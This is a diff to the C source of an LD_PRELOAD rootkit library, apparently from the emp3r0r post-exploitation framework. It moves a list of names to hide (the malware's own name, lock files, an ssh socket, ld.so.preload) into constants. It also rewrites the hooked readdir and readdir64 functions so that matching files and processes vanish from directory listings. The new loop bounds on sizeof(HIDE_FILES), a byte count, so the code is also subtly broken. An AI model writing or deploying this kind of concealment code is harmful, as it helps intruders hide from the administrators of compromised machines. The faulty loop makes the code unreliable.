@@ -1,5 +1,4 @@
 #define _GNU_SOURCE
-#include "libemp3r0r.h"
 #include <dirent.h>
 #include <dlfcn.h>
 #include <errno.h>
@@ -12,6 +11,13 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <unistd.h>
+
+// customize these
+const char* HIDE_ME = "emp3r0r";
+const char* SHM_FILE = "/dev/shm/emp3r0r_pids";
+const char* EMP_FILE = "/dev/shm/emp3r0r_path";
+const char* EmpPATH = "/dev/shm/emp3r0r";
+const char* HIDE_FILES[] = { "...", "e.lock", "ssh-s6Y4tDtahIuL", "ld.so.preload", ".bashprofile" };
 
 // trim trailing whitespace from a string
 void trim_str(char* buffer)
@@ -105,11 +111,13 @@ struct dirent64* readdir64(DIR* dirp)
         }
 
         // other directories
-        if (strstr(result->d_name, HIDE_ME)
-            || strcmp(result->d_name, "e.lock") == 0
-            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0
-            || strcmp(result->d_name, "ld.so.preload") == 0
-            || strcmp(result->d_name, "...") == 0) {
+        for (int i = 0; i < sizeof(HIDE_FILES); i++) {
+            if (strcmp(result->d_name, HIDE_FILES[i]) == 0) {
+                closedir(proc_1);
+                return temp;
+            }
+        }
+        if (strstr(result->d_name, HIDE_ME)) {
             closedir(proc_1);
             return temp;
         }
@@ -146,11 +154,13 @@ struct dirent* readdir(DIR* dirp)
         }
 
         // other directories
-        if (strstr(result->d_name, HIDE_ME)
-            || strcmp(result->d_name, "e.lock") == 0
-            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0
-            || strcmp(result->d_name, "ld.so.preload") == 0
-            || strcmp(result->d_name, "...") == 0) {
+        for (int i = 0; i < sizeof(HIDE_FILES); i++) {
+            if (strcmp(result->d_name, HIDE_FILES[i]) == 0) {
+                closedir(proc_1);
+                return temp;
+            }
+        }
+        if (strstr(result->d_name, HIDE_ME)) {
             closedir(proc_1);
             return temp;
         }
